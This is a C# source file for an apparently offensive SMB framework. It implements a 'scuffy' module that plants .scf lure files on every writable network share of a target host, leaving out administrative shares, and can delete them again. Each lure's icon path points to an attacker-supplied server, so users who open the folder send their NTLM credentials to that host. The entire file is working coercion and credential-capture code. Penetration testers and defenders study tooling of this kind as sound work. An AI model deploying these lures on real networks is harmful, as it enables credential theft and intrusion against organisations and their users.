using Titanis;
using System.Text;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// NetExec scuffy: drops .scf files with attacker icon UNC on writable shares.
/// Options: NAME=<name> (required), SERVER=<attacker> (required), CLEANUP=True.
/// </summary>
public sealed class SmbScuffyModule : AtlasModule<Smb2Client>
{
	public override string Name => "scuffy";
	public override string Description => "Drops .scf coercion lures with attacker icon (NAME=..., SERVER=..., CLEANUP=True)";

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		string name = ctx.Option("NAME", "");
		string server = ctx.Option("SERVER", "");
		if (string.IsNullOrWhiteSpace(name) || string.IsNullOrWhiteSpace(server))
		{
			AtlasConsole.Fail($"{ctx.Host}:445", "(scuffy) NAME and SERVER are required (e.g. -mo NAME=Docs,SERVER=10.0.0.5)");
			return;
		}
		bool cleanup = ctx.Option("CLEANUP", "").Equals("True", StringComparison.OrdinalIgnoreCase);
		string fileName = $"{name}.scf";
		try
		{
			byte[] content = Encoding.ASCII.GetBytes($"[Shell]\r\nCommand=2\r\nIconFile=\\\\{server}\\share\\icon.ico\r\n");
			var ignore = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "C$", "ADMIN$", "NETLOGON", "SYSVOL" };
			var shares = await SmbDropHelper.WritableSharesAsync(ctx, ignore, cancellationToken).ConfigureAwait(false);
			foreach (var share in shares)
			{
				cancellationToken.ThrowIfCancellationRequested();
				try
				{
					if (cleanup)
					{
						try { await ctx.Client.DeleteFileAsync(new Titanis.UncPath(ctx.Host, share, fileName), cancellationToken).ConfigureAwait(false); AtlasConsole.Success($"{ctx.Host}:445", $"(scuffy) cleaned \\\\{ctx.Host}\\{share}\\{fileName}"); }
						catch { AtlasConsole.Info($"{ctx.Host}:445", $"(scuffy) nothing to clean on {share}"); }
					}
					else
					{
						await SmbDropHelper.PutAsync(ctx, share, fileName, content, cancellationToken).ConfigureAwait(false);
						AtlasConsole.Success($"{ctx.Host}:445", $"(scuffy) dropped \\\\{ctx.Host}\\{share}\\{fileName} -> \\\\{server}\\share\\icon.ico");
					}
				}
				catch (Exception ex) { AtlasConsole.Warn($"{ctx.Host}:445", $"(scuffy) {share}: {ex.Message}"); }
			}
			if (shares.Count == 0) AtlasConsole.Info($"{ctx.Host}:445", "(scuffy) no writable shares found");
		}
		catch (Exception ex)
		{
			AtlasConsole.Fail($"{ctx.Host}:445", $"(scuffy) Failed: {ex.Message}");
		}
	}
}
